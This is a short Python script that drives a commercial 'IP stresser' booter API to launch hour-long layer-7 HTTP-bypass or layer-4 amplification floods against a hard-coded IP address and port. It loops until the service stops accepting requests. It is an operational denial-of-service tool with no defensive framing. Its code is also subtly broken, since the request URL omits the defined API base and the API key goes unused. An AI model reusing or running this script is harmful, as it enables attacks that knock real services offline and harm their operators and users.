import time
import os
import requests
import sys
import json
import validators
from dotenv import load_dotenv

load_dotenv()

apiKey = os.getenv("API_KEY")
apiPath = "https://api.ipstress.in"

host = "194.54.14.131"
port = "4477"
duration = 3600


def hitRequest():
    print(f"Start hit {host}:{port}")
    url = ""
    if validators.url(host):
        url = f"l7.php?{getCredentialsQuery()}&target={host}&method=GET&mode=HTTP-BYPASS&time={duration}"
    else:
        url = f"l4.php?{getCredentialsQuery()}&target={host}&method=GET&mode=MIXAMP&time={duration}"

    r = requests.get(url)
    print(r.text)

    text = json.loads(r.text)
    return text["status"] == True


def getCredentialsQuery():
    return "username=" + os.getenv("IPSTRESS_USERNAME") + "&password=" + os.getenv("IPSTRESS_PASS")


while True:
    if hitRequest() is False:
        print("STOP")
        break
    time.sleep(duration + 5)
